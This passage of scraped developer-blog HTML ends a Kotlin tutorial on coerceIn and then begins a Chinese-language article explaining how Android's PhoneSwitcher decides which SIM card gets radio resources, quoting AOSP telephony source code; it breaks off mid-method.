<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {
    <span class="hljs-keyword">val</span> value = <span class="hljs-number">5</span>
    
    <span class="hljs-comment">// 单点范围（最小值 = 最大值）</span>
    <span class="hljs-keyword">val</span> singlePointRange = <span class="hljs-number">5.</span><span class="hljs-number">.5</span>
    <span class="hljs-keyword">val</span> result1 = value.coerceIn(singlePointRange)
    println(result1)  <span class="hljs-comment">// 输出: 5</span>
    
    <span class="hljs-comment">// 如果值不在单点范围内</span>
    <span class="hljs-keyword">val</span> result2 = <span class="hljs-number">10.</span>coerceIn(singlePointRange)
    println(result2)  <span class="hljs-comment">// 输出: 5</span>
}
</code></pre>
<h3 data-id="heading-17"><strong>3. 性能考虑</strong></h3>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// coerceIn 是内联函数，性能开销很小</span>
<span class="hljs-comment">// 但在循环中大量使用时，可以考虑手动内联</span>

<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">processBatch</span><span class="hljs-params">(values: <span class="hljs-type">List</span>&lt;<span class="hljs-type">Int</span>&gt;)</span></span>: List&lt;<span class="hljs-built_in">Int</span>&gt; {
    <span class="hljs-keyword">val</span> min = <span class="hljs-number">0</span>
    <span class="hljs-keyword">val</span> max = <span class="hljs-number">100</span>
    
    <span class="hljs-comment">// 方式1：使用 coerceIn（推荐，代码清晰）</span>
    <span class="hljs-keyword">return</span> values.map { it.coerceIn(min, max) }
    
    <span class="hljs-comment">// 方式2：手动内联（在极端性能要求时考虑）</span>
    <span class="hljs-comment">// return values.map { if (it &lt; min) min else if (it &gt; max) max else it }</span>
}

<span class="hljs-comment">// 对于自定义类型，实现 Comparable 接口后即可使用 coerceIn</span>
<span class="hljs-keyword">data</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CustomValue</span>(<span class="hljs-keyword">val</span> score: <span class="hljs-built_in">Int</span>) : Comparable&lt;CustomValue&gt; {
    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">compareTo</span><span class="hljs-params">(other: <span class="hljs-type">CustomValue</span>)</span></span>: <span class="hljs-built_in">Int</span> = score.compareTo(other.score)
}
</code></pre>
<h2 data-id="heading-18">最佳实践</h2>
<h3 data-id="heading-19"><strong>1. 防御性编程</strong></h3>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Configuration</span> {
    <span class="hljs-comment">// 使用 coerceIn 确保配置值始终有效</span>
    <span class="hljs-keyword">var</span> brightness: <span class="hljs-built_in">Int</span> = <span class="hljs-number">50</span>
        <span class="hljs-keyword">set</span>(value) {
            field = value.coerceIn(<span class="hljs-number">0</span>, <span class="hljs-number">100</span>)
        }
    
    <span class="hljs-keyword">var</span> volume: <span class="hljs-built_in">Int</span> = <span class="hljs-number">50</span>
        <span class="hljs-keyword">set</span>(value) {
            field = value.coerceIn(<span class="hljs-number">0</span>, <span class="hljs-number">100</span>)
        }
    
    <span class="hljs-keyword">var</span> temperature: <span class="hljs-built_in">Int</span> = <span class="hljs-number">22</span>
        <span class="hljs-keyword">set</span>(value) {
            field = value.coerceIn(<span class="hljs-number">16</span>, <span class="hljs-number">28</span>)
        }
}

<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {
    <span class="hljs-keyword">val</span> config = Configuration()
    
    config.brightness = <span class="hljs-number">120</span>  <span class="hljs-comment">// 会被限制为 100</span>
    println(<span class="hljs-string">"亮度: <span class="hljs-subst">${config.brightness}</span>"</span>)  <span class="hljs-comment">// 输出: 亮度: 100</span>
    
    config.temperature = <span class="hljs-number">10</span>  <span class="hljs-comment">// 会被限制为 16</span>
    println(<span class="hljs-string">"温度: <span class="hljs-subst">${config.temperature}</span>"</span>)  <span class="hljs-comment">// 输出: 温度: 16</span>
}
</code></pre>
<h3 data-id="heading-20"><strong>2. 结合 when 表达式</strong></h3>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">categorizeScore</span><span class="hljs-params">(rawScore: <span class="hljs-type">Int</span>)</span></span>: String {
    <span class="hljs-keyword">val</span> score = rawScore.coerceIn(<span class="hljs-number">0</span>, <span class="hljs-number">100</span>)
    
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">when</span> (score) {
        <span class="hljs-keyword">in</span> <span class="hljs-number">90.</span><span class="hljs-number">.100</span> -&gt; <span class="hljs-string">"优秀"</span>
        <span class="hljs-keyword">in</span> <span class="hljs-number">80</span> until <span class="hljs-number">90</span> -&gt; <span class="hljs-string">"良好"</span>
        <span class="hljs-keyword">in</span> <span class="hljs-number">60</span> until <span class="hljs-number">80</span> -&gt; <span class="hljs-string">"及格"</span>
        <span class="hljs-keyword">else</span> -&gt; <span class="hljs-string">"不及格"</span>
    }
}

<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {
    println(categorizeScore(<span class="hljs-number">95</span>))   <span class="hljs-comment">// 输出: 优秀</span>
    println(categorizeScore(<span class="hljs-number">120</span>))  <span class="hljs-comment">// 输出: 优秀（限制为 100）</span>
    println(categorizeScore(-<span class="hljs-number">10</span>))  <span class="hljs-comment">// 输出: 不及格（限制为 0）</span>
}
</code></pre>
<h3 data-id="heading-21"><strong>3. 扩展函数增强</strong></h3>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// 为数字类型添加扩展函数</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-built_in">Int</span>.<span class="hljs-title">coerceInPercentage</span><span class="hljs-params">()</span></span>: <span class="hljs-built_in">Int</span> = <span class="hljs-keyword">this</span>.coerceIn(<span class="hljs-number">0</span>, <span class="hljs-number">100</span>)

<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-built_in">Double</span>.<span class="hljs-title">coerceInZeroToOne</span><span class="hljs-params">()</span></span>: <span class="hljs-built_in">Double</span> = <span class="hljs-keyword">this</span>.coerceIn(<span class="hljs-number">0.0</span>, <span class="hljs-number">1.0</span>)

<span class="hljs-comment">// 为颜色通道值添加扩展</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-built_in">Int</span>.<span class="hljs-title">coerceInColorChannel</span><span class="hljs-params">()</span></span>: <span class="hljs-built_in">Int</span> = <span class="hljs-keyword">this</span>.coerceIn(<span class="hljs-number">0</span>, <span class="hljs-number">255</span>)

<span class="hljs-comment">// 使用</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {
    <span class="hljs-keyword">val</span> percentage = <span class="hljs-number">150.</span>coerceInPercentage()
    println(<span class="hljs-string">"百分比: <span class="hljs-variable">$percentage</span>%"</span>)  <span class="hljs-comment">// 输出: 百分比: 100%</span>
    
    <span class="hljs-keyword">val</span> alpha = <span class="hljs-number">1.5</span>.coerceInZeroToOne()
    println(<span class="hljs-string">"透明度: <span class="hljs-variable">$alpha</span>"</span>)  <span class="hljs-comment">// 输出: 透明度: 1.0</span>
    
    <span class="hljs-keyword">val</span> red = <span class="hljs-number">300.</span>coerceInColorChannel()
    println(<span class="hljs-string">"红色通道: <span class="hljs-variable">$red</span>"</span>)  <span class="hljs-comment">// 输出: 红色通道: 255</span>
}
</code></pre>
<p><strong>总结</strong>：</p>
<ul>
<li><strong><code>coerceIn</code></strong> 是一个简单但强大的函数，用于将值限制在指定范围内</li>
<li>支持所有实现了 <code>Comparable</code> 接口的类型（<code>Int</code>、<code>Double</code>、<code>Char</code>、自定义类型等）</li>
<li>有两种使用方式：直接指定最小/最大值，或使用 <code>ClosedRange</code> 对象</li>
<li>适用于：UI 边界检查、游戏开发、数据验证、进度计算等多种场景</li>
<li>注意处理无效范围（最小值 &gt; 最大值时会抛出异常）</li>
<li>结合扩展函数可以创建更语义化的代码</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[PhoneSwitcher 如何决定哪张 SIM 卡可以使用射频资源]]></title>    <link>https://juejin.cn/post/7602464510607671322</link>    <guid>https://juejin.cn/post/7602464510607671322</guid>    <pubDate>2026-02-03T13:52:32.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602464510607671322" data-draft-id="7602464510607654938" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="PhoneSwitcher 如何决定哪张 SIM 卡可以使用射频资源"/> <meta itemprop="keywords" content="Android"/> <meta itemprop="datePublished" content="2026-02-03T13:52:32.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="用户341408199125"/> <meta itemprop="url" content="https://juejin.cn/user/570004686782272"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            PhoneSwitcher 如何决定哪张 SIM 卡可以使用射频资源
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/570004686782272/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    用户341408199125
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-03T13:52:32.000Z" title="Tue Feb 03 2026 13:52:32 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-03
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    5
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读6分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>很好的问题！让我分析 PhoneSwitcher 是如何决定哪张 SIM 卡可以使用射频资源的：</p>
<p>完美！现在我可以给你一个完整的解释了：</p>
<h2 data-id="heading-0">PhoneSwitcher 如何决定哪张 SIM 卡可以使用射频资源</h2>
<h3 data-id="heading-1"><strong>核心决策流程</strong></h3>
<p>PhoneSwitcher 通过 <strong><code>onEvaluate()</code></strong> 方法来决定射频资源的分配：</p>
<pre><code class="hljs language-1158:1300:frameworks_opt_telephony/src/java/com/android/internal/telephony/data/PhoneSwitcher.java" lang="1158:1300:frameworks_opt_telephony/src/java/com/android/internal/telephony/data/PhoneSwitcher.java">protected boolean onEvaluate(boolean requestsChanged, String reason) {
    StringBuilder sb = new StringBuilder(reason);

    // If we use HAL_COMMAND_PREFERRED_DATA,
    boolean diffDetected = mHalCommandToUse != HAL_COMMAND_PREFERRED_DATA &amp;&amp; requestsChanged;

    // Check if user setting of default non-opportunistic data sub is changed.
    int primaryDataSubId = mSubscriptionManagerService.getDefaultDataSubId();
    if (primaryDataSubId != mPrimaryDataSubId) {
        sb.append(" mPrimaryDataSubId ").append(mPrimaryDataSubId).append("-&gt;")
            .append(primaryDataSubId);
        mPrimaryDataSubId = primaryDataSubId;
        mLastSwitchPreferredDataReason = DataSwitch.Reason.DATA_SWITCH_REASON_MANUAL;
    }

    // Check to see if there is any active subscription on any phone
    boolean hasAnyActiveSubscription = false;

    // Check if phoneId to subId mapping is changed.
    for (int i = 0; i &lt; mActiveModemCount; i++) {
        int sub = SubscriptionManager.getSubscriptionId(i);

        if (SubscriptionManager.isValidSubscriptionId(sub)) hasAnyActiveSubscription = true;

        if (sub != mPhoneSubscriptions[i]) {
            sb.append(" phone[").append(i).append("] ").append(mPhoneSubscriptions[i]);
            sb.append("-&gt;").append(sub);
            if (mAutoSelectedDataSubId == mPhoneSubscriptions[i]) {
                mAutoSelectedDataSubId = DEFAULT_SUBSCRIPTION_ID;
            }
            mPhoneSubscriptions[i] = sub;

            if (!mFlags.changeMethodOfObtainingImsRegistrationRadioTech()) {
                // Listen to IMS radio tech change for new sub
                if (SubscriptionManager.isValidSubscriptionId(sub)) {
                    registerForImsRadioTechChange(mContext, i);
                }
            }

            diffDetected = true;
            mAutoDataSwitchController.notifySubscriptionsMappingChanged();
        }
    }

    if (!hasAnyActiveSubscription) {
        transitionToEmergencyPhone();
    } else {
        if (VDBG) log("Found an active subscription");
    }

    // Check if phoneId for preferred data is changed.
    int oldPreferredDataPhoneId = mPreferredDataPhoneId;

    // Check if subId for preferred data is changed.
    int oldPreferredDataSubId = mPreferredDataSubId.get();

    // When there are no subscriptions, the preferred data phone ID is invalid, but we want
    // to keep a valid phoneId for Emergency, so skip logic that updates for preferred data
    // phone ID. Ideally there should be a single set of checks that evaluate the correct
    // phoneId on a service-by-service basis (EIMS being one), but for now... just bypass
    // this logic in the no-SIM case.
    if (hasAnyActiveSubscription) updatePreferredDataPhoneId();

    if (oldPreferredDataPhoneId != mPreferredDataPhoneId) {
        sb.append(" preferred data phoneId ").append(oldPreferredDataPhoneId)
                .append("-&gt;").append(mPreferredDataPhoneId);
        diffDetected = true;
    } else if (oldPreferredDataSubId != mPreferredDataSubId.get()) {
        logl("SIM refresh, notify dds change");
        // Inform connectivity about the active data phone
        notifyPreferredDataSubIdChanged();
    }

    // Always force DDS when radio on. This is to handle the corner cases that modem and android
    // DDS are out of sync after APM, AP should force DDS when radio on. long term solution
    // should be having API to query preferred data modem to detect the out-of-sync scenarios.
    if (diffDetected || EVALUATION_REASON_RADIO_ON.equals(reason)) {
        logl("evaluating due to " + sb);
        if (mHalCommandToUse == HAL_COMMAND_PREFERRED_DATA) {
            // With HAL_COMMAND_PREFERRED_DATA, all phones are assumed to allow PS attach.
            // So marking all phone as active, and the phone with mPreferredDataPhoneId
            // will send radioConfig command.
            for (int phoneId = 0; phoneId &lt; mActiveModemCount; phoneId++) {
                mPhoneStates[phoneId].active = true;
            }
            sendRilCommands(mPreferredDataPhoneId);
        } else {
            List&lt;Integer&gt; newActivePhones = new ArrayList&lt;&gt;();

            // If all phones can have PS attached, activate all.
            // Otherwise, choose to activate phones according to requests. And
            // if list is not full, add mPreferredDataPhoneId.
            if (mMaxDataAttachModemCount == mActiveModemCount) {
                for (int i = 0; i &lt; mMaxDataAttachModemCount; i++) {
                    newActivePhones.add(i);
                }
            } else {
                // First try to activate phone in voice call.
                if (mPhoneIdInVoiceCall != SubscriptionManager.INVALID_PHONE_INDEX) {
                    newActivePhones.add(mPhoneIdInVoiceCall);
                }

                if (newActivePhones.size() &lt; mMaxDataAttachModemCount) {
                    for (TelephonyNetworkRequest networkRequest : mNetworkRequestList) {
                        int phoneIdForRequest = phoneIdForRequest(networkRequest);
                        if (phoneIdForRequest == INVALID_PHONE_INDEX) continue;
                        if (newActivePhones.contains(phoneIdForRequest)) continue;
                        newActivePhones.add(phoneIdForRequest);
                        if (newActivePhones.size() &gt;= mMaxDataAttachModemCount) break;
                    }
                }

                if (newActivePhones.size() &lt; mMaxDataAttachModemCount
                        &amp;&amp; !newActivePhones.contains(mPreferredDataPhoneId)
                        &amp;&amp; SubscriptionManager.isUsableSubIdValue(mPreferredDataPhoneId)) {
                    newActivePhones.add(mPreferredDataPhoneId);
                }
            }

            if (VDBG) {
                log("mPrimaryDataSubId = " + mPrimaryDataSubId);
                log("mAutoSelectedDataSubId = " + mAutoSelectedDataSubId);
                for (int i = 0; i &lt; mActiveModemCount; i++) {
                    log(" phone[" + i + "] using sub[" + mPhoneSubscriptions[i] + "]");
                }
                log(" newActivePhones:");
                for (Integer i : newActivePhones) log("  " + i);
            }

            for (int phoneId = 0; phoneId &lt; mActiveModemCount; phoneId++) {
                if (!newActivePhones.contains(phoneId)) {
                    deactivate(phoneId);
                }
            }

            // only activate phones up to the limit
            for (int phoneId : newActivePhones) {
                activate(phoneId);
            }
        }
    }
    return diffDetected;
}
</code></pre>
<h3 data-id="heading-2"><strong>决策因素（按优先级）</strong></h3>
<h4 data-id="heading-3"><strong>1. 紧急呼叫覆盖 (Emergency Override)</strong></h4>
<pre><code class="hljs language-1436:1445:frameworks_opt_telephony/src/java/com/android/internal/telephony/data/PhoneSwitcher.java" lang="1436:1445:frameworks_opt_telephony/src/java/com/android/internal/telephony/data/PhoneSwitcher.java">protected void updatePreferredDataPhoneId() {
    if (mEmergencyOverride != null &amp;&amp; findPhoneById(mEmergencyOverride.mPhoneId) != null) {
        // Override DDS for emergency even if user data is not enabled, since it is an
        // emergency.
        // TODO: Provide a notification to the user that metered data is currently being
        // used during this period.
        logl("updatePreferredDataPhoneId: preferred data overridden for emergency."
                + " phoneId = " + mEmergencyOverride.mPhoneId);
        mPreferredDataPhoneId = mEmergencyOverride.mPhoneId;
        mLastSwitchPreferredDataReason = DataSwitch.Reason.DATA_SWITCH_REASON_UNKNOWN;
</code></pre>
<p><strong>最高优先级</strong>：如果有紧急呼叫，立即切换到紧急呼叫所在的卡。</p>
<h4 data-id="heading-4"><strong>2. 语音通话中 (Voice Call In Progress)</strong></h4>
<pre><code class="hljs language-1447:1459:frameworks_opt_telephony/src/java/com/android/internal/telephony/data/PhoneSwitcher.java" lang="1447:1459:frameworks_opt_telephony/src/java/com/android/internal/telephony/data/PhoneSwitcher.java">    } else {
        int imsRegTech = mImsRegTechProvider.get(mContext, mPhoneIdInVoiceCall);
        if (isAnyVoiceCallActiveOnDevice() &amp;&amp; imsRegTech != REGISTRATION_TECH_IWLAN) {
            if (imsRegTech != REGISTRATION_TECH_CROSS_SIM) {
                mPreferredDataPhoneId = shouldSwitchDataDueToInCall()
                        ? mPhoneIdInVoiceCall : getFallbackDataPhoneIdForInternetRequests();
            } else {
                logl("IMS call on cross-SIM, skip switching data to phone "
                        + mPhoneIdInVoiceCall);
            }
        } else {
            mPreferredDataPhoneId = getFallbackDataPhoneIdForInternetRequests();
        }
    }
</code></pre>
<p><strong>条件</strong>：如果有语音通话，并且满足条件（用户开启了数据、语音卡也开启了数据），则切换到语音卡。</p>
<h4 data-id="heading-5"><strong>3. 自动选择的数据卡 (Auto Selected Data Sub)</strong></h4>
<pre><code class="hljs language-1467:1479:frameworks_opt_telephony/src/java/com/android/internal/telephony/data/PhoneSwitcher.java" lang="1467:1479:frameworks_opt_telephony/src/java/com/android/internal/telephony/data/PhoneSwitcher.java">private int getFallbackDataPhoneIdForInternetRequests() {
    int fallbackSubId = isActiveSubId(mAutoSelectedDataSubId)
            ? mAutoSelectedDataSubId : mPrimaryDataSubId;

    if (SubscriptionManager.isUsableSubIdValue(fallbackSubId)) {
        for (int phoneId = 0; phoneId &lt; mActiveModemCount; phoneId++) {
            if (mPhoneSubscriptions[phoneId] == fallbackSubId) {
                return phoneId;
            }
        }
    }
    return SubscriptionManager.INVALID_PHONE_INDEX;
}
</code></pre>
<p><strong>智能切换</strong>：系统可能因为信号质量等原因自动选择的数据卡。</p>
<h4 data-id="heading-6"><strong>4. 用户设置的主数据卡 (Primary Data Sub)</strong></h4>
<pre><code class="hljs language-1165:1171:frameworks_opt_telephony/src/java/com/android/internal/telephony/data/PhoneSwitcher.java" lang="1165:1171:frameworks_opt_telephony/src/java/com/android/internal/telephony/data/PhoneSwitcher.java">// Check if user setting of default non-opportunistic data sub is changed.
int primaryDataSubId = mSubscriptionManagerService.getDefaultDataSubId();
if (primaryDataSubId != mPrimaryDataSubId) {
    sb.append(" mPrimaryDataSubId ").append(mPrimaryDataSubId).append("-&gt;")
        .append(primaryDataSubId);
    mPrimaryDataSubId = primaryDataSubId;
    mLastSwitchPreferredDataReason = DataSwitch.Reason.DATA_SWITCH_REASON_MANUAL;
</code></pre>
<p><strong>默认选择</strong>：用户在设置中选择的默认数据卡。</p>
<h3 data-id="heading-7"><strong>射频资源分配方式</strong></h3>
<p>根据 Modem 能力，有两种分配方式：</p>
<h4 data-id="heading-8"><strong>方式 1: HAL_COMMAND_PREFERRED_DATA (新)</strong></h4>
<pre><code class="hljs language-1236:1243:frameworks_opt_telephony/src/java/com/android/internal/telephony/data/PhoneSwitcher.java" lang="1236:1243:frameworks_opt_telephony/src/java/com/android/internal/telephony/data/PhoneSwitcher.java">if (mHalCommandToUse == HAL_COMMAND_PREFERRED_DATA) {
    // With HAL_COMMAND_PREFERRED_DATA, all phones are assumed to allow PS attach.
    // So marking all phone as active, and the phone with mPreferredDataPhoneId
    // will send radioConfig command.
    for (int phoneId = 0; phoneId &lt; mActiveModemCount; phoneId++) {
        mPhoneStates[phoneId].active = true;
    }
    sendRilCommands(mPreferredDataPhoneId);
</code></pre>
<ul>
<li><strong>特点</strong>：所有 Phone 都标记为 active</li>
<li><strong>Modem 控制</strong>：通过 <code>setPreferredDataModem()</code> 告诉 Modem 哪个是首选数据卡</li>
<li><strong>现代设备</strong>：支持动态切换</li>
</ul>
<h4 data-id="heading-9"><strong>方式 2: HAL_COMMAND_ALLOW_DATA (旧)</strong></h4>
<pre><code class="hljs language-1244:1296:frameworks_opt_telephony/src/java/com/android/internal/telephony/data/PhoneSwitcher.java" lang="1244:1296:frameworks_opt_telephony/src/java/com/android/internal/telephony/data/PhoneSwitcher.java">} else {
    List&lt;Integer&gt; newActivePhones = new ArrayList&lt;&gt;();

    // If all phones can have PS attached, activate all.
    // Otherwise, choose to activate phones according to requests. And
    // if list is not full, add mPreferredDataPhoneId.
    if (mMaxDataAttachModemCount == mActiveModemCount) {
        for (int i = 0; i &lt; mMaxDataAttachModemCount; i++) {
            newActivePhones.add(i);
        }
    } else {
        // First try to activate phone in voice call.
        if (mPhoneIdInVoiceCall != SubscriptionManager.INVALID_PHONE_INDEX) {
            newActivePhones.add(mPhoneIdInVoiceCall);
        }

        if (newActivePhones.size() &lt; mMaxDataAttachModemCount) {
            for (TelephonyNetworkRequest networkRequest : mNetworkRequestList) {
                int phoneIdForRequest = phoneIdForRequest(networkRequest);
                if (phoneIdForRequest == INVALID_PHONE_INDEX) continue;
                if (newActivePhones.contains(phoneIdForRequest)) continue;
                newActivePhones.add(phoneIdForRequest);
                if (newActivePhones.size() &gt;= mMaxDataAttachModemCount) break;
            }
        }

        if (newActivePhones.size() &lt; mMaxDataAttachModemCount
                &amp;&amp; !newActivePhones.contains(mPreferredDataPhoneId)
                &amp;&amp; SubscriptionManager.isUsableSubIdValue(mPreferredDataPhoneId)) {
            newActivePhones.add(mPreferredDataPhoneId);
        }
    }

    if (VDBG) {
        log("mPrimaryDataSubId = " + mPrimaryDataSubId);
        log("mAutoSelectedDataSubId = " + mAutoSelectedDataSubId);
        for (int i = 0; i &lt; mActiveModemCount; i++) {
            log(" phone[" + i + "] using sub[" + mPhoneSubscriptions[i] + "]");
        }
        log(" newActivePhones:");
        for (Integer i : newActivePhones) log("  " + i);
    }

    for (int phoneId = 0; phoneId &lt; mActiveModemCount; phoneId++) {
        if (!newActivePhones.contains(phoneId)) {
            deactivate(phoneId);
        }
    }

    // only activate phones up to the limit
    for (int phoneId : newActivePhones) {
        activate(phoneId);
    }
}
</code></pre>
<ul>
<li><strong>特点</strong>：选择性激活 Phone</li>
<li><strong>优先级顺序</strong>：
<ol>
<li>语音通话中的卡</li>
<li>有网络请求的卡</li>
<li>首选数据卡</li>
</ol>
</li>
<li><strong>Android 控制</strong>：通过 <code>setDataAllowed()</code> 控制每个 Phone 是否允许 PS Attach</li>
</ul>
<h3 data-id="heading-10"><strong>最终执行：发送 RIL 命令</strong></h3>
<pre><code class="hljs language-1364:1381:frameworks_opt_telephony/src/java/com/android/internal/telephony/data/PhoneSwitcher.java" lang="1364:1381:frameworks_opt_telephony/src/java/com/android/internal/telephony/data/PhoneSwitcher.java">protected void sendRilCommands(int phoneId) {
    if (!SubscriptionManager.isValidPhoneId(phoneId)) {
        logl("sendRilCommands: skip dds switch due to invalid phoneId=" + phoneId);
        return;
    }

    Message message = Message.obtain(this, EVENT_MODEM_COMMAND_DONE, phoneId);
    if (mHalCommandToUse == HAL_COMMAND_ALLOW_DATA || mHalCommandToUse == HAL_COMMAND_UNKNOWN) {
        // Skip ALLOW_DATA for single SIM device
        if (mActiveModemCount &gt; 1) {
            PhoneFactory.getPhone(phoneId).mCi.setDataAllowed(isPhoneActive(phoneId), message);
        }
    } else if (phoneId == mPreferredDataPhoneId) {
